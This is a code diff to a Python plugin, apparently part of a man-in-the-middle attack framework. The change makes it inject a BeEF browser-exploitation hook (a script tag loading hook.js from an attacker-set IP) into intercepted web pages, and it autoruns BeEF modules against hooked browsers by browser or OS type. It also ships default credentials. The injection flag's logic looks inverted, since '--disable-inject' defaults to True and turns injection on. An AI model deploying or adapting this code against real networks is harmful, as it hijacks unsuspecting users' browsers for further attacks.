@@ -1,4 +1,5 @@
 from plugins.plugin import Plugin
+from plugins.Inject import Inject
 from time import sleep
 import sys
 import json
@@ -15,19 +16,21 @@ requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Conne
 requests_log.setLevel(logging.WARNING)
 
 
-class BeefAutorun(Plugin):
+class BeefAutorun(Inject, Plugin):
 	name = "BeEFAutorun"
 	optname = "beefauto"
 	has_opts = True
-	desc = "Autoruns BeEF modules based on Browser or OS type"
+	desc = "Injects BeEF hooks & autoruns modules based on Browser or OS type"
 
 	def initialize(self, options):
 		self.options = options
-		self.autoruncfg =  options.autoruncfg or "./config_files/beefautorun.cfg"
+		self.autoruncfg =  options.autoruncfg
+		self.hookip = options.hookip
 		self.beefip = options.beefip
 		self.beefport = options.beefport
 		self.beefuser = options.beefuser
 		self.beefpass = options.beefpass
+		self.dis_inject = options.dis_inject
 
 		beef = beefapi.BeefAPI({"host": self.beefip, "port": self.beefport})
 		if beef.login(self.beefuser, self.beefpass):
@@ -40,6 +43,13 @@ class BeefAutorun(Plugin):
 
 		self.All_modules = userconfig["ALL"]
 		self.Targeted_modules = userconfig["targets"]
+
+		if self.dis_inject:
+			if not self.hookip:
+				sys.exit("[-] BeEFAutorun requires --hookip")
+			Inject.initialize(self, options)
+			self.count_limit = 1
+			self.html_payload = '<script type="text/javascript" src="http://%s:%s/hook.js"></script>' % (self.hookip, self.beefport)
 
 		print "[*] BeEFAutorun plugin online => Mode: %s" % self.Mode
 		t = threading.Thread(name="autorun", target=self.autorun, args=(beef,))
@@ -107,8 +117,10 @@ class BeefAutorun(Plugin):
 									sleep(0.5)
 
 	def add_options(self, options):
+		options.add_argument('--hookip', dest='hookip', help="Hook IP")
 		options.add_argument('--beefip', dest='beefip', default='127.0.0.1', help="IP of BeEF's server [default: localhost]")
 		options.add_argument('--beefport', dest='beefport', default='3000', help="Port of BeEF's server [default: 3000]")
 		options.add_argument('--beefuser', dest='beefuser', default='beef', help='Username for beef [default: beef]')
 		options.add_argument('--beefpass', dest='beefpass', default='beef', help='Password for beef [default: beef]')
-		options.add_argument('--autoruncfg', type=file, help='Specify a config file [default: beefautorun.cfg]')
+		options.add_argument('--autoruncfg', type=file, default="./config_files/beefautorun.cfg", help='Specify a config file [default: beefautorun.cfg]')
+		options.add_argument('--disable-inject', dest='dis_inject', action='store_true', default=True, help='Disables automatically injecting the hook url')
